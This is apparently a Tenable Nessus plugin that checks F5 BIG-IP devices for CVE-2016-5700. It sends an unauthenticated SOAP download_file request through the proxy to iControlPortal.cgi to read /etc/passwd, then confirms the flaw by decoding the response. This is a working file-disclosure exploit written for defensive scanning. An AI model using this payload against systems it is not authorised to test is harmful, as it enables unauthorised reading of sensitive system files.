#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(94408);
  script_version("$Revision: 1.3 $");
  script_cvs_date("$Date: 2016/12/08 20:11:34 $");

  script_cve_id("CVE-2016-5700");
  script_bugtraq_id(93325);
  script_osvdb_id(144931);

  script_name(english:"F5 Networks BIG-IP : BIG-IP Virtual Server HTTP Explicit Proxy / SOCKS Profile RCE (SOL35520031) (uncredentialed check)");
  script_summary(english:"Attempts to retrieve a restrictive file.");

  script_set_attribute(attribute:"synopsis", value:
"The remote device is missing a vendor-supplied security patch.");
  script_set_attribute(attribute:"description", value:
"The BIG-IP virtual server running on the remote host is affected by a
remote command execution vulnerability. This issue exists in servers
that are configured to use the HTTP Explicit Proxy functionality
and/or SOCKS profile. An unauthenticated, remote attacker can exploit
this vulnerability to modify the BIG-IP system configuration, disclose
sensitive system files, or possibly execute arbitrary commands.

Note that this plugin only deals with explicit proxy mode HTTP
profiles and may not detect the vulnerability when only a SOCKS
profile is assigned to the virtual server.");
  script_set_attribute(attribute:"see_also", value:"http://support.f5.com/kb/en-us/solutions/public/k/35/sol35520031.html");
  script_set_attribute(attribute:"solution", value:
"Upgrade to one of the non-vulnerable versions listed in the F5
Solution SOL35520031.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:U/RL:OF/RC:C");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:H");
  script_set_cvss3_temporal_vector("CVSS:3.0/E:U/RL:O/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"No known exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"false");

  script_set_attribute(attribute:"vuln_publication_date", value:"2016/09/28");
  script_set_attribute(attribute:"patch_publication_date", value:"2016/09/28");
  script_set_attribute(attribute:"plugin_publication_date", value:"2016/10/28");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:f5:big-ip_application_acceleration_manager");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:f5:big-ip_access_policy_manager");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:f5:big-ip_advanced_firewall_manager");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:f5:big-ip_application_security_manager");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:f5:big-ip_link_controller");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:f5:big-ip_local_traffic_manager");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:f5:big-ip_policy_enforcement_manager");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:f5:big-ip_websafe");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2016 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_require_ports("Services/www", 80, 443);

  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("dump.inc");

port = get_http_port(default:80);

file = "/etc/passwd";

url = "http://127.0.0.1/iControl/iControlPortal.cgi";

data = '<?xml version="1.0" encoding="UTF-8"?>
<soapenv:Envelope
 xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
 xmlns:xsd="http://www.w3.org/2001/XMLSchema"
 xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
  <soapenv:Body>
    <ns1:download_file
     soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"
     xmlns:ns1="urn:iControl:System/ConfigSync">
        <file_name xsi:type="xsd:string">' + file + '</file_name>
        <chunk_size href="#id0"/>
        <file_offset href="#id1"/>
    </ns1:download_file>
    <multiRef id="id1"
      soapenc:root="0"
      soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"
      xsi:type="xsd:long"
      xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/">
      0
    </multiRef>
    <multiRef id="id0"
      soapenc:root="0"
      soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"
      xsi:type="xsd:long"
      xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/">
      65536 
    </multiRef>
  </soapenv:Body>
</soapenv:Envelope>';

res = http_send_recv3(
  method          : "POST",
  item            : url,
  port            : port,
  data            : data,
  exit_on_fail    : TRUE
);

req = http_last_sent_request();

# Vulnerable: we got some file content
if (res[0] =~ "^HTTP/[0-9]\.[0-9] 200" &&
    (matches = eregmatch(string:res[2], pattern: "<file_data[\s\S]*>(.*)</file_data>"))
)
{
  file_data = base64_decode(str: matches[1]);
  if(file_data)
  {
    if(file_data =~ "^[\s\S]*root.*/bin/bash")
    { 
      security_report_v4(
        port      : port, 
        severity  : SECURITY_HOLE,
        file      : file,
        output    : file_data,
        request   : make_list(req)
      );
    }
    else
    {
      exit(1, 'Decoded file data does not appear to be ' + file + ': \n' + hexdump(ddata: file_data));
    }  
  }
  else
  {
    exit(1, 'Failed to base64-decode file content. HTTP response: \n' + hexdump(ddata: res[2])); 
  }
}
else
{
  exit(0, 'The remote host is not a BIG-IP system or Nessus cannot determine whether the remote host is vulnerable.'); 
}

